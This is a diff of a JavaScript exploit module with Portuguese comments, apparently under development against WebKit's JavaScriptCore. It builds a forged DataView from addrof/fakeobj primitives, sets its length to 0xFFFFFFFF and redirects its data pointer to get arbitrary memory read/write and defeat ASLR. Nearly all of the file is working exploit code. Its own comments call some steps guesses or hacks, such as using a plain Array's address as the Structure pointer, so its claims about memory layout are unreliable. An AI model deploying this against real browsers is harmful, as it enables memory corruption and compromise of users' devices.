@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v129 - R60 FINAL - L/E Universal REAL e Independente de old_arb_read para SETUP)
+// js/script3/testArrayBufferVictimCrash.mjs (v130 - R60 FINAL - L/E Universal REAL e Independente de old_arb_read para SETUP + String de ID Aprimorada)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL, SEM DEPENDER DA old_arb_read PARA O SETUP.
@@ -21,7 +21,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v129_ARB_RW_UNIVERSAL_INDEPENDENT_FINAL"; // String de identificação única
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v130_ARB_RW_UNIVERSAL_INDEPENDENT_FINAL"; // String de identificação única no log
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -47,53 +47,32 @@ let _fake_dv_backing_array_global = null; // O Array JS que serve como "corpo" d
  */
 async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
     const FNAME = "setupUniversalArbitraryReadWrite";
-    logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView (v129 - SEM old_arb_read para setup)...`, "subtest", FNAME);
+    logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView (v130 - SEM old_arb_read para setup)...`, "subtest", FNAME);
 
     try {
-        // --- 1. Obter o ponteiro da Structure de um DataView legítimo (ASSUMIDO de addrof_core) ---
-        // Se addrof_core e fakeobj_core funcionam para objetos JS, então o `addrof_core`
-        // de um DataView legítimo nos dá o endereço JSValue do DataView.
-        // O `Structure*` é o primeiro campo (Offset 0x0) de qualquer `JSCell`.
-        // Então, o ponteiro da Structure é o próprio endereço do DataView legítimo retornado por addrof_core.
-
-        const legit_dv_for_structure = new DataView(new ArrayBuffer(1));
-        const legit_dv_addr = addrof_core(legit_dv_for_structure); // Este é o endereço do JSCell do DataView.
-        logFn(`[${FNAME}] Endereço do DataView legítimo (para Structure): ${legit_dv_addr.toString(true)}`, "leak", FNAME);
-        await pauseFn(LOCAL_SHORT_PAUSE);
-
-        // O ponteiro para a Structure do DataView é, de fato, `legit_dv_addr`.
-        // Mas para usar em `fake_dv_backing_array`, ele precisa ser o ponteiro da Structure,
-        // não o ponteiro para a instância do DataView.
-        // A Structure é um objeto separado no heap.
-
-        // Em um exploit real, você *vazaria* o ponteiro da Structure usando addrof_core + layout hacking
-        // ou disassembly. Como addrof_core em si não é um arb_read, e a old_arb_read não acessa o heap JS,
-        // não podemos vazar a Structure de um DV real via código.
-        // Então, temos que usar um VALOR HACK ou assumir que addrof_core({}) nos dá uma Structure válida
-        // para o `fake_data_view`.
-
-        // HACK DE PONTEIRO DE STRUCTURE:
-        // Se a `old_arb_read` não funciona no heap de objetos, não podemos vazar o structure_ptr real.
-        // VAMOS ASSUMIR QUE O PONTEIRO DA STRUCTURE PARA UM JSDataView É UM ENDEREÇO CONHECIDO DO BINÁRIO.
-        // Em vez de ler, vamos "plantar" o endereço que esperamos que seja o da Structure de um DataView.
-        // Este valor *precisa vir de disassembly ou um leak prévio muito específico*.
-        // Para fins de demonstração, vamos usar o endereço de JSC::JSArrayBufferView::s_info como uma base aproximada.
-        // Este é um HACK PARA CONTINUAR. A precisão dependerá do seu ambiente alvo.
-        // O offset de JSC::JSArrayBufferView::s_info em relação à sua Structure é 0x8 (m_cachedTypeInfo).
-        // Então, se o s_info está em 0x3AE5040, a Structure estaria em 0x3AE5040 - 0x8.
-        const assumed_dv_structure_s_info_base = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
-        const assumed_dv_structure_ptr = assumed_dv_structure_s_info_base.sub(JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET); // Subtrai o offset de m_cachedTypeInfo.
-        
-        logFn(`[${FNAME}] Assumindo ponteiro da Structure para DataView (HACK): ${assumed_dv_structure_ptr.toString(true)}`, "warn", FNAME);
+        // --- 1. Obter o ponteiro da Structure de um DataView legítimo ---
+        // VAMOS HACKEAR: Usar o endereço de um Array JavaScript simples como o ponteiro da Structure
+        // para o DataView forjado. Isso é um chute para fins de teste, pois o layout real pode variar.
+        // Em um exploit de produção, este endereço viria de disassembly ou de um vazamento confiável de Structure.
+        const structure_of_simple_js_array = addrof_core(new Array(1)); // Obter o endereço de um Array simples.
+        logFn(`[${FNAME}] Usando o endereço de um Array JS simples como ponteiro de Structure (HACK para DataView): ${structure_of_simple_js_array.toString(true)}`, "warn", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
 
         // --- 2. Preparar um "corpo" de DataView forjado na memória JS controlável ---
-        _fake_dv_backing_array_global = new Array(4);
-        _fake_dv_backing_array_global[0] = assumed_dv_structure_ptr; // Ponteiro da Structure do JSDataView (HACKED!)
-        _fake_dv_backing_array_global[1] = AdvancedInt64.Zero;     // Associated ArrayBuffer (dummy, pode ser ajustado se precisarmos de um real)
-        _fake_dv_backing_array_global[2] = AdvancedInt64.Zero;     // m_vector (ponteiro para dados, será manipulado)
+        // `_fake_dv_backing_array_global` é o array JS que nosso DataView forjado vai "ver".
+        // Layout do JSDataView (simplificado, cada elemento = 8 bytes):
+        // Index 0 (Offset 0x00): Structure*
+        // Index 1 (Offset 0x08): Associated ArrayBuffer
+        // Index 2 (Offset 0x10): m_vector (ponteiro para dados)
+        // Index 3 (Offset 0x18): m_length
+        // Index 4 (Offset 0x20): m_mode (flags) -- Adicionado para completar o layout básico de 0x20 bytes
+        _fake_dv_backing_array_global = new Array(5); // 5 elementos * 8 bytes/elemento = 40 bytes.
+        _fake_dv_backing_array_global[0] = structure_of_simple_js_array; // Ponteiro da Structure (HACKED!)
+        _fake_dv_backing_array_global[1] = AdvancedInt64.Zero;            // Associated ArrayBuffer (dummy)
+        _fake_dv_backing_array_global[2] = AdvancedInt64.Zero;            // m_vector (ponteiro para dados, será manipulado)
         _fake_dv_backing_array_global[3] = new AdvancedInt64(0x00000000, 0xFFFFFFFF); // m_length = 0xFFFFFFFF
+        _fake_dv_backing_array_global[4] = new AdvancedInt64(0x00000001, 0x00000000); // m_mode = 0x1 (Default flags para DataView)
 
         // Obter o endereço deste array JS com addrof_core.
         const fake_dv_backing_addr = addrof_core(_fake_dv_backing_array_global);
@@ -104,7 +83,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
         _fake_data_view = fakeobj_core(fake_dv_backing_addr);
 
         if (!(_fake_data_view instanceof DataView)) {
-            logFn(`[${FNAME}] ERRO CRÍTICO: fakeobj_core não conseguiu criar um DataView forjado válido! Tipo: ${typeof _fake_data_view}. Isso pode ser devido à Structure* incorreta.`, "critical", FNAME);
+            logFn(`[${FNAME}] ERRO CRÍTICO: fakeobj_core não conseguiu criar um DataView forjado válido! Tipo: ${typeof _fake_data_view}. Isso pode ser devido à Structure* incorreta ou layout do backing array.`, "critical", FNAME);
             return false;
         }
         logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view}`, "good", FNAME);
@@ -120,30 +99,16 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
         test_val_to_write_bytes[3] = 0xEF;
         logFn(`[${FNAME}] ArrayBuffer de teste preenchido com 0xDEADC0DE.`, "debug", FNAME);
         
-        // Obter o endereço dos dados brutos do legit_arb_for_test (o m_vector do ArrayBuffer)
-        // O ArrayBufferContents* é o ponteiro para os dados brutos.
-        // Em JSC, um ArrayBuffer (JSArrayBuffer) tem em 0x10 o ponteiro para seus dados brutos (ContentsImpl*).
-        // Podemos usar a primitiva fakeobj para "ver" dentro do legit_arb_for_test.
-        // Criar um DataView forjado que aponta para o legit_arb_for_test.
-        // Para isso, precisaríamos da Structure de JSArrayBuffer e do seu offset para o m_contents.
-
-        // Simplificando MUITO: Em muitos casos, o endereço do ArrayBuffer JS object é próximo ao endereço dos seus dados brutos,
-        // ou o ponteiro de dados está em um offset previsível do objeto ArrayBuffer.
-        // A melhor forma de obter o endereço dos dados brutos é criar uma *nova* primitiva fakeobj:
-        // um fakeobj para um *ArrayBuffer* que aponta para o legit_arb_for_test.
-        // Mas como isso requer a Structure de JSArrayBuffer... a solução mais prática é:
-        // **Confiar que `test_uint8_array_to_dump.byteOffset` é 0 e `test_uint8_array_to_dump.buffer` é o `ArrayBuffer` real.**
-        // E o endereço dos dados brutos do ArrayBuffer está no offset `0x10` da *instância do ArrayBuffer (JSArrayBuffer)*.
-        
-        // Obtendo o endereço dos dados brutos do ArrayBuffer *do objeto JSArrayBuffer*.
-        const legit_arb_contents_address = addrof_core(legit_arb_for_test.buffer); // Isso é o JSCell do ArrayBufferContents*
+        // Obter o endereço dos dados brutos do legit_arb_for_test.
+        // O .buffer de um ArrayBuffer é um ponteiro para o ArrayBufferContents*.
+        // O `addrof_core` em `legit_arb_for_test.buffer` nos dá o endereço desse ContentsImpl.
+        const legit_arb_contents_address = addrof_core(legit_arb_for_test.buffer);
         logFn(`[${FNAME}] Endereço dos dados brutos do ArrayBuffer legítimo: ${legit_arb_contents_address.toString(true)}`, "leak", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
 
         // Agora, podemos usar `_fake_data_view` para L/E Arbitrária de verdade.
-        // O `_fake_data_view` tem seu m_vector manipulável via `_fake_dv_backing_array_global[2]`.
-        // Redirecionamos `_fake_data_view` para o `legit_arb_contents_address`.
+        // Redirecionamos `_fake_data_view` para o `legit_arb_contents_address` manipulando `_fake_dv_backing_array_global[2]`.
         _fake_dv_backing_array_global[2] = legit_arb_contents_address; // Redireciona m_vector do fake DataView
         logFn(`[${FNAME}] m_vector do DataView forjado redirecionado para os dados do ArrayBuffer de teste: ${legit_arb_contents_address.toString(true)}`, "info", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
@@ -175,8 +140,6 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
         addrof_success = false;
         fakeobj_success = false;
         rw_test_on_fakeobj_success = false;
-        // structure_ptr_found = false; // Não aplicável diretamente aqui
-        // contents_ptr_leaked = false; // Não aplicável diretamente aqui
     } finally {
         logFn(`--- Configuração da L/E Universal Concluída (Sucesso: ${rw_test_on_fakeobj_success}) ---`, "test", FNAME);
         logFn(`Resultados: Addrof OK: ${addrof_success}, Fakeobj Criação OK: ${fakeobj_success}, L/E Universal OK: ${rw_test_on_fakeobj_success}`, "info", FNAME);
